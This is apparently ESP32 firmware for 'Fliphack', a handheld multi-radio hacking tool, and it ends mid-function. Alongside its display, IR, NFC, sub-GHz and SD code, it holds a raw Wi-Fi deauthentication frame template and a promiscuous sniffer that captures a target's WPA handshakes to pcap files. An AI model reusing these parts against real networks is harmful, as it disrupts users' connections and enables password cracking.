#include <Arduino.h>
#include <TFT_eSPI.h> 
#include <lvgl.h>
#include "ui.h" 
#include "driver/gpio.h" 
#include <SPI.h>
#include <SD.h>
#include <IRrecv.h>   
#include <IRutils.h>  
#include <RadioLib.h> 
#include <TinyGPS++.h> 
#include <sys/time.h> 
#include <WiFi.h> 
#include <esp_wifi.h> 
#include <FS.h>
#include <Wire.h>
#include <Adafruit_PN532.h>

#define JOY_UP    12  
#define JOY_LEFT  11 
#define JOY_DOWN  38  
#define JOY_RIGHT 40  
#define JOY_OK    39  

#define GPS_RX_PIN 18 
#define GPS_TX_PIN 9
#define BUZZER_PIN 1 

#define SPI_SCK_PIN  21
#define SPI_MISO_PIN 14
#define SPI_MOSI_PIN 47

#define SD_CS_PIN    48
#define TFT_CS_PIN   16

#define CC_CS_PIN    5 
#define CC_GDO0_PIN  15
#define CC_GDO2_PIN  42

#define NRF_CSN_PIN  6 
#define NRF_CE_PIN   7  
#define NRF_IRQ_PIN  4  

#define IR_RX_PIN    2

#define PN_532_SCL_PIN 10
#define PN_532_SDA_PIN 13

Adafruit_PN532 nfc(PN_532_SDA_PIN, PN_532_SCL_PIN);

TFT_eSPI tft = TFT_eSPI(); 

CC1101 cc1101 = new Module(CC_CS_PIN, CC_GDO0_PIN, RADIOLIB_NC, CC_GDO2_PIN);
nRF24 nrf24 = new Module(NRF_CSN_PIN, NRF_IRQ_PIN, NRF_CE_PIN);

TinyGPSPlus gps;
bool nmea_paused = false;
String nmea_buffer = ""; 

bool BUZZER_ON = true;

bool     pn532_ok              = false;
bool     nfc_scan_active       = false;
uint8_t  nfc_last_uid[7]       = {0};
uint8_t  nfc_last_uid_len      = 0;
uint8_t  nfc_last_sak          = 0;
String   nfc_last_uid_str      = "";
String   nfc_last_type_str     = "";
bool     nfc_tag_found         = false;

float current_cc_freq = 433.92;
bool cc1101_ok = false;
int cc1101_last_state = RADIOLIB_ERR_NONE;
bool cc1101_receiving = false;
uint32_t cc1101_last_retry_ms = 0;

bool sd_card_ok = false;

String fliphack_target_ssid = "NONE";
String fliphack_target_bssid = "00:00:00:00:00:00"; 
uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; 
int fliphack_target_channel = 0;
int fliphack_target_rssi = 0;
String fliphack_target_enc = "OPEN";

int wifi_scan_status = 0;

bool deauth_running = false;
uint32_t deauth_packets_sent = 0;
uint32_t deauth_start_time = 0;

struct pcap_file_header {
    uint32_t magic_number  = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t  thiszone      = 0;
    uint32_t sigfigs       = 0;
    uint32_t snaplen       = 65535;
    uint32_t network       = 105; 
};

struct pcap_record_header {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};

bool     handshake_capture_active = false;
bool     handshake_captured       = false;
uint8_t  handshake_count          = 0;
File     pcap_file;
bool     pcap_file_open           = false;
String   pcap_filename            = "";

void IRAM_ATTR wifi_sniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshake_capture_active) return;
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* data   = pkt->payload;
    uint16_t       len    = pkt->rx_ctrl.sig_len;

    if (len < 24) return;

    bool match = false;
    for (int addr_offset : {4, 10, 16}) {
        if (memcmp(data + addr_offset, target_mac, 6) == 0) { match = true; break; }
    }
    if (!match) return;

    uint8_t frame_type = (data[0] & 0x0C) >> 2;
    if (frame_type != 2) return;

    uint8_t fc_subtype = (data[0] & 0xF0) >> 4;
    int hdr_len = 24;
    if (fc_subtype & 0x08) hdr_len = 26;

    if (len < (uint16_t)(hdr_len + 8)) return;

    const uint8_t* llc = data + hdr_len;
    if (llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x88 && llc[7] == 0x8E) {
        if (!pcap_file_open) return;

        struct timeval tv;
        gettimeofday(&tv, NULL);

        pcap_record_header rec;
        rec.ts_sec  = tv.tv_sec;
        rec.ts_usec = tv.tv_usec;
        rec.incl_len = len;
        rec.orig_len = len;

        pcap_file.write((uint8_t*)&rec, sizeof(rec));
        pcap_file.write(data, len);
        pcap_file.flush();

        handshake_count++;
        handshake_captured = (handshake_count >= 4);
    }
}

void start_handshake_capture() {
    if (pcap_file_open) return;

    handshake_count    = 0;
    handshake_captured = false;

    char fname[40];
    sprintf(fname, "/handshakes/%s.pcap",
            fliphack_target_ssid.length() > 0 ? fliphack_target_ssid.c_str() : "hidden");
    pcap_filename = String(fname);

    if (!SD.exists("/handshakes")) SD.mkdir("/handshakes");

    pcap_file = SD.open(pcap_filename, FILE_WRITE);
    if (!pcap_file) return;

    pcap_file_header fhdr;
    pcap_file.write((uint8_t*)&fhdr, sizeof(fhdr));
    pcap_file.flush();
    pcap_file_open = true;

    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
    handshake_capture_active = true;
}

void stop_handshake_capture() {
    handshake_capture_active = false;
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (pcap_file_open) {
        pcap_file.close();
        pcap_file_open = false;
    }
}

static const char* nfcTagTypeName(uint8_t sak) {
    if (sak == 0x08 || sak == 0x00) return "MIFARE Classic 1K";
    if (sak == 0x18)                return "MIFARE Classic 4K";
    if (sak == 0x20)                return "MIFARE DESFire";
    if (sak == 0x60)                return "MIFARE Plus";
    if (sak == 0x28)                return "JCOP Java Card";
    return "ISO14443-A";
}

static String nfcUidToString(uint8_t* uid, uint8_t len) {
    String s = "";
    for (uint8_t i = 0; i < len; i++) {
        if (uid[i] < 0x10) s += "0";
        s += String(uid[i], HEX);
        if (i < len - 1) s += ":";
    }
    s.toUpperCase();
    return s;
}

static void nfcSaveTagToSD() {
    if (!sd_card_ok || !nfc_tag_found) return;
    if (!SD.exists("/nfc_tags")) SD.mkdir("/nfc_tags");

    String uid_clean = nfc_last_uid_str;
    uid_clean.replace(":", "");

    String type_short = nfc_last_type_str;
    type_short.replace(" ", "_"); 

    String fname = "/nfc_tags/" + uid_clean + "_" + type_short + ".txt";

    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        Serial.println("Chyba: Nelze otevrit soubor pro zapis!");
        return;
    }

    f.printf("--- TAG INFO ---\n");
    f.printf("UID: %s\n", nfc_last_uid_str.c_str());
    f.printf("SAK: 0x%02X\n", nfc_last_sak);
    f.printf("Type: %s\n", nfc_last_type_str.c_str());
    f.printf("Timestamp: %lu\n", millis()); 
    f.close();
    
    Serial.println("Ulozeno do: " + fname);
}

static void nfcResetGui() {
    if (ui_ReadTagUID1)   lv_label_set_text(ui_ReadTagUID1,   "--:--:--:--");
    if (ui_ReadTagSAK)    lv_label_set_text(ui_ReadTagSAK,    "0x--");
    if (ui_ReadTagType)   lv_label_set_text(ui_ReadTagType,   "---");
    if (ui_ReadTagStatus) {
        lv_label_set_text(ui_ReadTagStatus, "APPROACH CARD");
        lv_obj_set_style_text_color(ui_ReadTagStatus,
            lv_color_hex(0xFFB200), LV_PART_MAIN | LV_STATE_DEFAULT);
    }
    nfc_tag_found = false;
}

uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 
    0x07, 0x00 
};

static const uint16_t screenWidth  = 280;
static const uint16_t screenHeight = 240;
static lv_disp_draw_buf_t draw_buf;
static lv_color_t *buf; 
bool isBooted = false;

lv_group_t * g; 
lv_obj_t * current_screen = NULL;

IRrecv irrecv(IR_RX_PIN);
decode_results results;

uint64_t learn_signal_value = 0;
uint16_t learn_signal_bits = 0;
decode_type_t learn_signal_protocol = UNKNOWN;
uint32_t learn_signal_address = 0;
uint32_t learn_signal_command = 0;
bool learn_signal_has_data = false;

static void learnSignalResetData() {
    learn_signal_value = 0;
    learn_signal_bits = 0;
    learn_signal_protocol = UNKNOWN;
    learn_signal_address = 0;
    learn_signal_command = 0;
    learn_signal_has_data = false;
}

static void learnSignalSetWaitingGui() {
    if (!ui_LearnSignalIRSTATUS || !ui_LearnSignalProtocol ||
        !ui_LearnSignalAdress || !ui_LearnSignalCommand) {
        return;
    }

    lv_label_set_text(ui_LearnSignalIRSTATUS, "Waiting for IR signal...");
    lv_obj_set_style_text_color(ui_LearnSignalIRSTATUS, lv_color_hex(0xFFFFFF),
                                LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_label_set_text(ui_LearnSignalProtocol, "----");
    lv_label_set_text(ui_LearnSignalAdress, "0x00");
    lv_label_set_text(ui_LearnSignalCommand, "0x00");
}

static void learnSignalUpdateGui(const decode_results *ir_results) {
    if (!ir_results) return;

    learn_signal_value = ir_results->value;
    learn_signal_bits = ir_results->bits;
    learn_signal_protocol = ir_results->decode_type;
    learn_signal_address = ir_results->address;
    learn_signal_command = ir_results->command;
    learn_signal_has_data = true;

    if (!ui_LearnSignalIRSTATUS || !ui_LearnSignalProtocol ||
        !ui_LearnSignalAdress || !ui_LearnSignalCommand) {
        return;
    }

    String protocol = typeToString(ir_results->decode_type);
    char address_buf[16];
    char command_buf[24];

    lv_label_set_text_fmt(ui_LearnSignalIRSTATUS, "IR signal learned (%u bits)",
                          ir_results->bits);
    lv_obj_set_style_text_color(ui_LearnSignalIRSTATUS, lv_color_hex(0x00FF48),
                                LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_label_set_text(ui_LearnSignalProtocol, protocol.c_str());

    if (ir_results->decode_type == UNKNOWN) {
        snprintf(address_buf, sizeof(address_buf), "RAW");
        snprintf(command_buf, sizeof(command_buf), "0x%llX",
                 (unsigned long long)ir_results->value);
    } else {
        snprintf(address_buf, sizeof(address_buf), "0x%04lX",
                 (unsigned long)ir_results->address);
        snprintf(command_buf, sizeof(command_buf), "0x%04lX",
                 (unsigned long)ir_results->command);
    }

    lv_label_set_text(ui_LearnSignalAdress, address_buf);
    lv_label_set_text(ui_LearnSignalCommand, command_buf);
}

void playTone(int freq, int duration) {
   tone(BUZZER_PIN, freq, duration);
   delay(duration + 30); 
}


static void learnSignalHandleRescanButton() {
    static bool rescan_was_pressed = false;
    if (!ui_LearnSignalRESCAN) return;

    bool rescan_is_pressed = lv_obj_get_state(ui_LearnSignalRESCAN) & LV_STATE_PRESSED;
    if (rescan_is_pressed && !rescan_was_pressed) {
        learnSignalResetData();
        learnSignalSetWaitingGui();
        irrecv.resume();
    }

    rescan_was_pressed = rescan_is_pressed;
}

static bool cc1101BeginRadio() {
    digitalWrite(TFT_CS_PIN, HIGH);
    digitalWrite(SD_CS_PIN, HIGH);
    digitalWrite(NRF_CSN_PIN, HIGH);

    cc1101_receiving = false;
    cc1101_last_state = cc1101.begin(current_cc_freq, 4.8, 48.0, 26.0, 10, 32);
    cc1101_ok = (cc1101_last_state == RADIOLIB_ERR_NONE);

    if (cc1101_ok) {
        cc1101.standby();
    }

    return cc1101_ok;
}

static bool cc1101SetReceiveMode(bool enabled) {
    if (!cc1101_ok) return false;

    if (enabled && !cc1101_receiving) {
        cc1101_last_state = cc1101.startReceive();
        cc1101_receiving = (cc1101_last_state == RADIOLIB_ERR_NONE);
        return cc1101_receiving;
    }

    if (!enabled && cc1101_receiving) {
        cc1101_last_state = cc1101.standby();
        cc1101_receiving = false;
    }

    return true;
}

static const char *sdCardTypeName(uint8_t card_type) {
    switch (card_type) {
        case CARD_MMC: return "MMC";
        case CARD_SD: return "SDSC";
        case CARD_SDHC: return "SDHC";
        default: return "NONE";
    }
}

static void updateMainMenuGui() {
    if (ui_time) {
        struct timeval tv;
        gettimeofday(&tv, NULL);
        struct tm *timeinfo = localtime(&tv.tv_sec);
        if (timeinfo && timeinfo->tm_year >= 120) {
            lv_label_set_text_fmt(ui_time, "%02d:%02d", timeinfo->tm_hour, timeinfo->tm_min);
        } else {
            uint32_t uptime_s = millis() / 1000;
            lv_label_set_text_fmt(ui_time, "%02lu:%02lu", uptime_s / 60, uptime_s % 60);
        }
    }

    if (ui_SDCONNECTION) {
        bool has_sd = sd_card_ok && SD.cardType() != CARD_NONE;
        lv_label_set_text(ui_SDCONNECTION, has_sd ? "SD" : "NO SD");
        lv_obj_set_style_text_color(ui_SDCONNECTION,
                                    has_sd ? lv_color_hex(0x32FF00) : lv_color_hex(0xFF3030),
                                    LV_PART_MAIN | LV_STATE_DEFAULT);
    }

    if (ui_FirmwareProject) {
        lv_label_set_text(ui_FirmwareProject, "Fliphack v1.0");
    }

    if (ui_battery) {
        lv_bar_set_value(ui_battery, 100, LV_ANIM_OFF);
    }
}

static void updateDeviceInfoGui() {
    if (ui_DeviceInfoFirmware) lv_label_set_text(ui_DeviceInfoFirmware, "Fliphack v1.0");
    if (ui_DeviceInfoTemp) lv_label_set_text_fmt(ui_DeviceInfoTemp, "%.1f C", temperatureRead());
    if (ui_DeviceInfoBattery) lv_label_set_text(ui_DeviceInfoBattery, "USB/EXT");

    if (ui_DeviceInfoPSRAMFREE) {
        uint32_t free_kb = ESP.getFreePsram() / 1024;
        uint32_t total_kb = ESP.getPsramSize() / 1024;
        lv_label_set_text_fmt(ui_DeviceInfoPSRAMFREE, "%lu/%lu KB",
                              (unsigned long)free_kb, (unsigned long)total_kb);
    }
}

static void updateStorageInfoGui() {
    if (!ui_StorageInfoCardType || !ui_StorageTotalSpace ||
        !ui_StorageUsedSpace || !ui_StorageFreeSpace || !ui_StorageBar) {
        return;
    }

    uint8_t card_type = sd_card_ok ? SD.cardType() : CARD_NONE;
    if (card_type == CARD_NONE) {
        lv_label_set_text(ui_StorageInfoCardType, "NO SD");
        lv_label_set_text(ui_StorageTotalSpace, "-- MB");
        lv_label_set_text(ui_StorageUsedSpace, "-- MB");
        lv_label_set_text(ui_StorageFreeSpace, "-- MB");
        lv_bar_set_value(ui_StorageBar, 0, LV_ANIM_OFF);
        return;
    }

    uint64_t total_bytes = SD.cardSize();
    uint64_t used_bytes = SD.usedBytes();
    uint64_t free_bytes = (total_bytes > used_bytes) ? (total_bytes - used_bytes) : 0;
    uint32_t total_mb = total_bytes / (1024 * 1024);
    uint32_t used_mb = used_bytes / (1024 * 1024);
    uint32_t free_mb = free_bytes / (1024 * 1024);
    int used_pct = (total_bytes > 0) ? (int)((used_bytes * 100) / total_bytes) : 0;

    lv_label_set_text(ui_StorageInfoCardType, sdCardTypeName(card_type));
    lv_label_set_text_fmt(ui_StorageTotalSpace, "%lu MB", (unsigned long)total_mb);
    lv_label_set_text_fmt(ui_StorageUsedSpace, "%lu MB", (unsigned long)used_mb);
    lv_label_set_text_fmt(ui_StorageFreeSpace, "%lu MB", (unsigned long)free_mb);
    lv_bar_set_value(ui_StorageBar, constrain(used_pct, 0, 100), LV_ANIM_OFF);
}

void *my_lv_mem_alloc(size_t size) { return heap_caps_malloc(size, MALLOC_CAP_SPIRAM); }
void my_lv_mem_free(void *data) { heap_caps_free(data); }

void my_disp_flush(lv_disp_drv_t *disp, const lv_area_t *area, lv_color_t *color_p) {
    uint32_t w = (area->x2 - area->x1 + 1);
    uint32_t h = (area->y2 - area->y1 + 1);
    tft.startWrite(); tft.pushImage(area->x1, area->y1, w, h, (uint16_t *)&color_p->full); tft.endWrite(); lv_disp_flush_ready(disp);
}

void my_keypad_read(lv_indev_drv_t * indev_drv, lv_indev_data_t * data) {
    static uint32_t last_key = 0;
    if (digitalRead(JOY_UP) == LOW) { data->state = LV_INDEV_STATE_PR; last_key = LV_KEY_PREV; } 
    else if (digitalRead(JOY_DOWN) == LOW) { data->state = LV_INDEV_STATE_PR; last_key = LV_KEY_NEXT; } 
    else if (digitalRead(JOY_LEFT) == LOW) { data->state = LV_INDEV_STATE_PR; last_key = LV_KEY_LEFT; } 
    else if (digitalRead(JOY_RIGHT) == LOW) { data->state = LV_INDEV_STATE_PR; last_key = LV_KEY_RIGHT; } 
    else if (digitalRead(JOY_OK) == LOW) { data->state = LV_INDEV_STATE_PR; last_key = LV_KEY_ENTER; } 
    else { data->state = LV_INDEV_STATE_REL; }
    data->key = last_key; 
}

void add_all_children_to_group(lv_obj_t * parent, lv_group_t * group) {
    uint32_t child_cnt = lv_obj_get_child_cnt(parent);
    for(uint32_t i = 0; i < child_cnt; i++) {
        lv_obj_t * child = lv_obj_get_child(parent, i);
        if (lv_obj_has_flag(child, LV_OBJ_FLAG_CLICKABLE)) lv_group_add_obj(group, child);
        add_all_children_to_group(child, group);
    }
}

void load_group_for_screen(lv_obj_t * act_scr) {
    lv_group_remove_all_objs(g); 
    add_all_children_to_group(act_scr, g);
    lv_obj_t * first_obj = lv_group_get_focused(g);
    if(first_obj) lv_obj_add_state(first_obj, LV_STATE_FOCUSED); 
}

void parseBytes(const char* str, char sep, byte* bytes, int maxBytes, int base) {
    for (int i = 0; i < maxBytes; i++) {
        bytes[i] = strtoul(str, NULL, base);
        str = strchr(str, sep);
        if (str == NULL || *str == '\0') break;
        str++;
    }
}

static void wifi_btn_event_handler(lv_event_t * e) {
    int index = (int)(intptr_t)lv_event_get_user_data(e); 
    
    fliphack_target_ssid = WiFi.SSID(index);
    fliphack_target_bssid = WiFi.BSSIDstr(index);
    fliphack_target_channel = WiFi.channel(index);
    fliphack_target_rssi = WiFi.RSSI(index);

    parseBytes(fliphack_target_bssid.c_str(), ':', target_mac, 6, 16);

    switch (WiFi.encryptionType(index)) {
        case WIFI_AUTH_OPEN: fliphack_target_enc = "OPEN"; break;
        case WIFI_AUTH_WEP: fliphack_target_enc = "WEP"; break;
        case WIFI_AUTH_WPA_PSK: fliphack_target_enc = "WPA"; break;
        case WIFI_AUTH_WPA2_PSK: fliphack_target_enc = "WPA2"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: fliphack_target_enc = "WPA/WPA2"; break;
        case WIFI_AUTH_WPA2_ENTERPRISE: fliphack_target_enc = "ENTERPRISE"; break;
        default: fliphack_target_enc = "WPA3 / UNKNOWN"; break;
    }

    _ui_screen_change(&ui_WIFIDetails, LV_SCR_LOAD_ANIM_FADE_ON, 500, 0, &ui_WIFIDetails_screen_init);
}

void create_perfect_wifi_clone(int index, const char* ssid_str, int ch_val, int pwr_val) {
    lv_obj_t * btn = lv_btn_create(ui_WIFINetworks);
    lv_obj_set_width(btn, lv_pct(103));
    lv_obj_set_height(btn, lv_pct(19));
    lv_obj_set_x(btn, -494);
    lv_obj_set_y(btn, -39);
    lv_obj_set_align(btn, LV_ALIGN_LEFT_MID);
    lv_obj_add_flag(btn, LV_OBJ_FLAG_SCROLL_ON_FOCUS);
    lv_obj_clear_flag(btn, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_style_radius(btn, 2, LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(btn, lv_color_hex(0xB026FF), LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_bg_opa(btn, 0, LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_border_color(btn, lv_color_hex(0x4400E9), LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_border_opa(btn, 255, LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_border_width(btn, 2, LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_text_color(btn, lv_color_hex(0x4400E9), LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_text_opa(btn, 255, LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(btn, lv_color_hex(0x0000D4), LV_PART_MAIN | LV_STATE_PRESSED);
    lv_obj_set_style_bg_opa(btn, 255, LV_PART_MAIN | LV_STATE_PRESSED);
    lv_obj_set_style_bg_color(btn, lv_color_hex(0x8C3EF9), LV_PART_MAIN | LV_STATE_FOCUSED);
    lv_obj_set_style_bg_opa(btn, 255, LV_PART_MAIN | LV_STATE_FOCUSED);
    lv_obj_set_style_text_color(btn, lv_color_hex(0x000000), LV_PART_MAIN | LV_STATE_FOCUSED);
    lv_obj_set_style_text_opa(btn, 255, LV_PART_MAIN | LV_STATE_FOCUSED);

    lv_obj_t * lbl_ch = lv_label_create(btn);
    lv_obj_set_width(lbl_ch, LV_SIZE_CONTENT);
    lv_obj_set_height(lbl_ch, LV_SIZE_CONTENT);
    lv_obj_set_x(lbl_ch, 22);
    lv_obj_set_y(lbl_ch, 1);
    lv_obj_set_align(lbl_ch, LV_ALIGN_CENTER);
    lv_label_set_text(lbl_ch, "CH:");
    lv_obj_set_style_text_color(lbl_ch, lv_color_hex(0x000000), LV_PART_MAIN | LV_STATE_FOCUSED);

    lv_obj_t * lbl_pwr = lv_label_create(btn);
    lv_obj_set_width(lbl_pwr, LV_SIZE_CONTENT);
    lv_obj_set_height(lbl_pwr, LV_SIZE_CONTENT);
    lv_obj_set_x(lbl_pwr, 74);
    lv_obj_set_y(lbl_pwr, 1);
    lv_obj_set_align(lbl_pwr, LV_ALIGN_CENTER);
    lv_label_set_text(lbl_pwr, "PWR:");
    lv_obj_set_style_text_color(lbl_pwr, lv_color_hex(0x000000), LV_PART_MAIN | LV_STATE_FOCUSED);

    lv_obj_t * val_pwr = lv_label_create(btn);
    lv_obj_set_width(val_pwr, 23);
    lv_obj_set_height(val_pwr, LV_SIZE_CONTENT);
    lv_obj_set_x(val_pwr, 202);
    lv_obj_set_y(val_pwr, 1);
    lv_obj_set_align(val_pwr, LV_ALIGN_LEFT_MID);
    char pwr_buf[10]; sprintf(pwr_buf, "%d", pwr_val);
    lv_label_set_text(val_pwr, pwr_buf);
    lv_obj_set_style_text_color(val_pwr, lv_color_hex(0xFFFFFF), LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_text_color(val_pwr, lv_color_hex(0x000000), LV_PART_MAIN | LV_STATE_FOCUSED);

    lv_obj_t * val_ch = lv_label_create(btn);
    lv_obj_set_width(val_ch, 20);
    lv_obj_set_height(val_ch, LV_SIZE_CONTENT);
    lv_obj_set_x(val_ch, 144);
    lv_obj_set_y(val_ch, 1);
    lv_obj_set_align(val_ch, LV_ALIGN_LEFT_MID);
    char ch_buf[10]; sprintf(ch_buf, "%d", ch_val);
    lv_label_set_text(val_ch, ch_buf);
    lv_obj_set_style_text_color(val_ch, lv_color_hex(0xFFFFFF), LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_text_color(val_ch, lv_color_hex(0x000000), LV_PART_MAIN | LV_STATE_FOCUSED);

    lv_obj_t * val_ssid = lv_label_create(btn);
    lv_obj_set_width(val_ssid, 130);
    lv_obj_set_height(val_ssid, 15);
    lv_obj_set_x(val_ssid, -11);
    lv_obj_set_y(val_ssid, 0);
    lv_obj_set_align(val_ssid, LV_ALIGN_LEFT_MID);
    lv_label_set_long_mode(val_ssid, LV_LABEL_LONG_DOT);
    lv_label_set_text(val_ssid, ssid_str);
    lv_obj_set_style_text_color(val_ssid, lv_color_hex(0xFFFFFF), LV_PART_MAIN | LV_STATE_DEFAULT);
    lv_obj_set_style_text_color(val_ssid, lv_color_hex(0x000000), LV_PART_MAIN | LV_STATE_FOCUSED);

    lv_obj_add_event_cb(btn, wifi_btn_event_handler, LV_EVENT_CLICKED, (void*)(intptr_t)index);
}

void setup() {
    delay(4000); 
    Serial.begin(115200);
    Serial.println("\n--- START HARDWARU ---");

    pinMode(TFT_CS_PIN, OUTPUT);  digitalWrite(TFT_CS_PIN, HIGH);
    pinMode(SD_CS_PIN, OUTPUT);   digitalWrite(SD_CS_PIN, HIGH);
    pinMode(CC_CS_PIN, OUTPUT);   digitalWrite(CC_CS_PIN, HIGH);
    pinMode(NRF_CSN_PIN, OUTPUT); digitalWrite(NRF_CSN_PIN, HIGH);

    SPI.begin(SPI_SCK_PIN, SPI_MISO_PIN, SPI_MOSI_PIN, SD_CS_PIN);
    delay(100); 

    Serial.print("CC1101 SubGHz... ");
    cc1101BeginRadio();
    if (cc1101_ok) Serial.println("OK!"); else { Serial.print("CHYBA! Kód: "); Serial.println(cc1101_last_state); }
    delay(50);

    Serial.print("NRF24L01... ");
    int state_nrf = nrf24.begin();
    if (state_nrf == RADIOLIB_ERR_NONE) Serial.println("OK!"); else { Serial.print("CHYBA! Kód: "); Serial.println(state_nrf); }
    delay(50);

    Serial.print("SD Karta... ");
    sd_card_ok = SD.begin(SD_CS_PIN, SPI, 4000000);
    if (!sd_card_ok) Serial.println("CHYBA!"); else Serial.printf("OK (%llu MB)\n", SD.cardSize() / (1024 * 1024));
    Serial.print("PN532 NFC (I2C)... ");

    Wire.begin(PN_532_SDA_PIN, PN_532_SCL_PIN);
    nfc.begin();
    uint32_t versiondata = nfc.getFirmwareVersion();
    if (versiondata) {
        pn532_ok = true;
        nfc.SAMConfig();
        Serial.printf("OK (v%d.%d)\n",
            (versiondata >> 16) & 0xFF,
            (versiondata >>  8) & 0xFF);
    } else {
        pn532_ok = false;
        Serial.println("CHYBA! (nenalezen)");
    }

    irrecv.enableIRIn();  
    Serial.println("IR Prijimac... OK");

    Serial1.begin(9600, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    Serial.println("--- HARDWARE INICIALIZOVÁN ---");
}

void loop() {
    if (!isBooted) {
        buf = (lv_color_t*)heap_caps_malloc(screenWidth * 40 * sizeof(lv_color_t), MALLOC_CAP_SPIRAM);
        if (buf == NULL) while(1) delay(100);

        tft.init(); tft.setRotation(1); tft.setSwapBytes(false); tft.invertDisplay(true); tft.fillScreen(TFT_BLACK);
        lv_init(); lv_disp_draw_buf_init(&draw_buf, buf, NULL, screenWidth * 40);
        static lv_disp_drv_t disp_drv;
        lv_disp_drv_init(&disp_drv);
        disp_drv.hor_res = screenWidth; disp_drv.ver_res = screenHeight; disp_drv.flush_cb = my_disp_flush; disp_drv.draw_buf = &draw_buf;
        lv_disp_drv_register(&disp_drv);

        pinMode(JOY_UP, INPUT_PULLUP); pinMode(JOY_DOWN, INPUT_PULLUP); pinMode(JOY_LEFT, INPUT_PULLUP);
        pinMode(JOY_RIGHT, INPUT_PULLUP); pinMode(JOY_OK, INPUT_PULLUP);

        gpio_reset_pin(GPIO_NUM_39); gpio_set_direction(GPIO_NUM_39, GPIO_MODE_INPUT); gpio_set_pull_mode(GPIO_NUM_39, GPIO_PULLUP_ONLY);
        gpio_reset_pin(GPIO_NUM_40); gpio_set_direction(GPIO_NUM_40, GPIO_MODE_INPUT); gpio_set_pull_mode(GPIO_NUM_40, GPIO_PULLUP_ONLY);

        static lv_indev_drv_t indev_drv; lv_indev_drv_init(&indev_drv); indev_drv.type = LV_INDEV_TYPE_KEYPAD; indev_drv.read_cb = my_keypad_read; lv_indev_t * my_indev = lv_indev_drv_register(&indev_drv);
        g = lv_group_create(); lv_group_set_default(g); lv_indev_set_group(my_indev, g);

        ui_init(); 
        current_screen = lv_scr_act(); load_group_for_screen(current_screen);
        isBooted = true;
        if (BUZZER_ON){
            pinMode(BUZZER_PIN, OUTPUT);
            playTone(1000, 150); 
        }
        Serial.println("====== FLIPHACK O.S. PRIPRAVEN ======");
        
        
    } else {
        static uint32_t last_tick = millis();
        lv_tick_inc(millis() - last_tick);
        last_tick = millis();
        lv_timer_handler(); 

        if (current_screen != lv_scr_act()) {
            current_screen = lv_scr_act(); 
            load_group_for_screen(current_screen);
            
            static bool initial_dummy_cleared = false;
            if (current_screen == ui_ScanAPs && !initial_dummy_cleared) {
                lv_obj_clean(ui_WIFINetworks);
                initial_dummy_cleared = true;
            }
            
            if (current_screen == ui_WiFiMenu && ui_WIFIMenuTarget) lv_label_set_text(ui_WIFIMenuTarget, fliphack_target_ssid.c_str());
            if (current_screen == ui_ScanAPs && ui_WIFIMenuTarget1) lv_label_set_text(ui_WIFIMenuTarget1, fliphack_target_ssid.c_str());
            if (current_screen == ui_DeauthAttack && ui_DeauthAttackTarget) lv_label_set_text(ui_DeauthAttackTarget, fliphack_target_ssid.c_str());

            if (current_screen != ui_DeauthAttack && deauth_running) {
                deauth_running = false;
                stop_handshake_capture();
                WiFi.mode(WIFI_STA); 
            }

            if (current_screen == ui_SpectrumAnalyzer) {
                nrf24.startReceive(); 
            } else {
                nrf24.standby(); 
            }

            cc1101SetReceiveMode(current_screen == ui_FREQAnalyzer);

            if (current_screen == ui_WIFIDetails) {
                if (ui_WIFIMenuTarget2) lv_label_set_text(ui_WIFIMenuTarget2, fliphack_target_ssid.c_str());
                if (ui_SSIDDetails) lv_label_set_text(ui_SSIDDetails, fliphack_target_ssid.c_str());
                if (ui_BSSIDDetails) lv_label_set_text(ui_BSSIDDetails, fliphack_target_bssid.c_str());
                if (ui_ChannelDetails) lv_label_set_text_fmt(ui_ChannelDetails, "%d", fliphack_target_channel);
                if (ui_RSSIDetails) lv_label_set_text_fmt(ui_RSSIDetails, "%d dBm", fliphack_target_rssi);
                if (ui_EncryptionDetails) lv_label_set_text(ui_EncryptionDetails, fliphack_target_enc.c_str());
                
                if (ui_BeaconsDetails) lv_label_set_text(ui_BeaconsDetails, "N/A");
                if (ui_WPSDetails) lv_label_set_text(ui_WPSDetails, "N/A");
                if (ui_HiddenDetails) lv_label_set_text(ui_HiddenDetails, fliphack_target_ssid.length() == 0 ? "YES" : "NO");
                if (ui_ClientsDetails) lv_label_set_text(ui_ClientsDetails, "Skryto");
                if (ui_DATAPKTSDetails) lv_label_set_text(ui_DATAPKTSDetails, "0");
            }

            if (current_screen == ui_LearnSignal) {
                learnSignalResetData();
                learnSignalSetWaitingGui();
                irrecv.enableIRIn();
            }

            if (current_screen == ui_ReadTag) {
               nfcResetGui();
               nfc_scan_active = true;
               if (!pn532_ok) {
